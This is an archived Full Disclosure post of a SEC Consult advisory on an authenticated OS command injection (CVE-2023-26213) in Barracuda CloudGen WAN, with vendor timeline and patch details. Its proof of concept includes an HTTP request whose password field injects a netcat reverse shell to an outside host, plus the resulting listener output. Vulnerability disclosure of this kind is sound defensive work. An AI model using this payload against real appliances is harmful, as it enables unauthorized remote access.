---
title: SEC Consult SA-20230228-0 :: OS Command Injectionin Barracuda CloudGen WAN
url: https://seclists.org/fulldisclosure/2023/Mar/2
source: Full Disclosure
date: 2023-03-04
fetch_date: 2025-10-04T08:42:07.048632
---

# SEC Consult SA-20230228-0 :: OS Command Injectionin Barracuda CloudGen WAN

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20230228-0 :: OS Command Injectionin Barracuda CloudGen WAN

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>
*Date*: Tue, 28 Feb 2023 12:40:09 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20230228-0 >
=======================================================================
               title: OS Command Injection
             product: Barracuda CloudGen WAN
  vulnerable version: < v8.* hotfix 1089
       fixed version: v8.* with hotfix webui-sdwan-1089-8.3.1-174141891 or above
                      version 9.0.0 or above
          CVE number: CVE-2023-26213
              impact: High
            homepage: https://www.barracuda.com/products/network-security/cloudgen-wan
               found: 2023-01-12
                  by: Stefan Viehböck (Office Vienna)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"CloudGen WAN is more than just another SD-WAN solution. It lets you build
an automated cloud-based network by leveraging the Microsoft Global Network.
The product of a joint development program by Microsoft and Barracuda,
CloudGen WAN is the only global secure SD-WAN service built natively on Azure.
It is a single, unified solution that makes it very simple to ensure highly
secure, seamless connectivity to all your locations and all your cloud-based
resources and applications."

Source: https://www.barracuda.com/products/network-security/cloudgen-wan

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated OS Command Injection (CVE-2023-26213)
Barracuda CloudGen WAN provides a private edge appliance for hybrid deployments.

An authenticated user in the administration interface for the private edge
virtual appliance can inject arbitrary OS commands via the
/ajax/update_certificate endpoint.

Proof of concept:
-----------------
1) Authenticated OS Command Injection (CVE-2023-26213)
The affected PHP application running on the appliance implements a custom
wrapper for securely executing OS commands. The wrapper is inspired by SQL
prepared statements and uses placeholders.

Unfortunately an attacker can inject new placeholder strings within arguments.
In the case where two or more arguments are controlled by the user, this allows
an attacker to craft a placeholder which executes arbitrary commands.

Example of a vulnerable call:
```php
             // Extract the cert with the password
             $extract_cert_status = BN_Shell::exec(
                 "openssl pkcs12 -in :tmp_cert -out :dst -clcerts -nokeys -passin pass::password",
                 array(
                     'tmp_cert' => $cert_folder . $name . '.base64',
                     'dst' => $cert_folder . $name,
                     'password' => $password
                 )
             );
```

Excerpt from BN_Shell::exec():
```php
        // Execute a full command.
        // If you need to escape arguments, replace them with bind params, similar to sql binds.
        // Example: exec('ls /tmp/')
        // Example: exec('cp :source :dest', array('source' => '/src/dir/', 'dest' => '/dest/dir'))
        public static function exec($command, array $params = array()) {
                // escape and replace binds with values
                foreach($params as $param => $value) {
                        $value = static::escape($value); // --- SEC Consult: this internally calls escapeshellargs() on
the argument
                        $command = str_replace(":$param", $value, $command);
                }
                static::$_last_command = $command;

                $return = array();

                // use proc_open to get stdout and stderr
                $descriptorspec = array(
                        0 => array("pipe", "r"), // stdin is a pipe that the child will read from
                        1 => array("pipe", "w"), // stdout is a pipe that the child will write to
                        2 => array("pipe", "w")  // stderr is a file to write to
                );
```

The following HTTP request exploits the issue.

The "name" argument contains the placeholder string ":password". At runtime,
this is replaced by the argument "password", which in this case executes a
reverse shell.

POST /ajax/update_certificate HTTP/1.1
Host: host
Cookie: session_id=jk7dai0pv2vr9npoarfqnuajll
X-Csrf-Token: 2da43562a3e1552259dea8dde327cd97c5176fdd
Content-Type: application/json;charset=utf-8
Content-Length: 999

{"pem":{"certificate":{},"key":{}},"pems":{"certificate":{},"key":{}},"pkcs12":{"certificate":{"content":"XXXXXXXXXXXXXXXX","name":"keyStoreAAA
 :password.pfx"},"key":{},"password":"; nc -e /bin/sh
192.168.200.1 4242 # XXX"},"currentType":"pkcs12"}

$ nc -l -p 4242
id
uid=48(www-data) gid=48(www-data) groups=48(www-data)

Vulnerable / tested versions:
-----------------------------
The issue was found in Barracuda CloudGen WAN (private edge appliance) version
8.3.1 (GWAY-8.3.1-0086-VTxxx.ova).

Vendor contact timeline:
------------------------
2023-01-12: Contacting vendor through bugcrowd submission.
2023-01-12: Auto-response from bugcrowd, submission set to "not applicable".
2023-01-13: Response from vendor, set to "triaged".
2023-01-24: Vendor provides a patch/diff.
2023-02-14: Vendor informs us that patch/hotfix 1089 has been released on 26th
             January as automatic patch for CGW sites and gateways. It targets
             version 8 and will be included in the future version 9. Vendor
             sets submission to "resolved"
2023-02-14: Asking whether it is applicable to bug bounty and for CVE number.
             No response.
2023-02-20: Informing vendor that we are going to request a CVE number and will
             publish the advisory afterwards.
2023-02-20: Vendor response: no CVE was assigned yet, provides link to security
             note.
2023-02-28: Release of security advisory.

Solution:
---------
There is an updated version 8 with hotfix 1089 available, future version 9 also
incorporates the fix.

Barracuda customers should check the SDWAN WebUI or the cloud-based Appliance
Dashboard (under the "Hotfixes" tab) and should confirm that:

* The appliance is on version 8.* and it has hotfix webui-sdwan-1089-8.3.1-174141891 installed; or
* The appliance is on version 9.0.0 or above

The vendor published the following release notes:
https://campus.barracuda.com/product/cloudgenwan/doc/96024723/release-notes-8-3-1/
(search for hotfix 1089)

Workaround:
-----------
None

Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC...